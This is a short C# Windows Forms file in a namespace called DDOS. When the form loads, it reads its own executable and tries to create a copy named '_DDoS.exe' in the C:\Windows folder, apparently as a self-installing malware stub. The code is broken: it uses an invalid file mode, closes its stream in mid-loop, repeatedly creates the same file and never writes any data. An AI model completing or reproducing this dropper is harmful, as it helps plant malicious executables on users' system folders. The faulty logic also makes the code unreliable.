using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;





namespace DDOS
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string path = this.GetType().Assembly.Location;
            FileMode mode = new FileMode ();
            FileStream copyer = new FileStream(path, mode);
            bool empty = false ;
            do
            {
                byte[] buffer = new byte[1024];
                copyer.Read(buffer, 0, 1024);
                for (int i = 0; i != 1024; )
                {
                    if (buffer[i] == 0)
                    {
                        empty = true;
                    }
                    else
                    {
                        empty = false;
                        i = 1024;
                    }
                    i++;
                }
                copyer.Close();
           
                copyer = new FileStream("c:/Windows/_DDoS.exe", FileMode.CreateNew);
               
                
            } while (!empty);
            
        }
    }
}
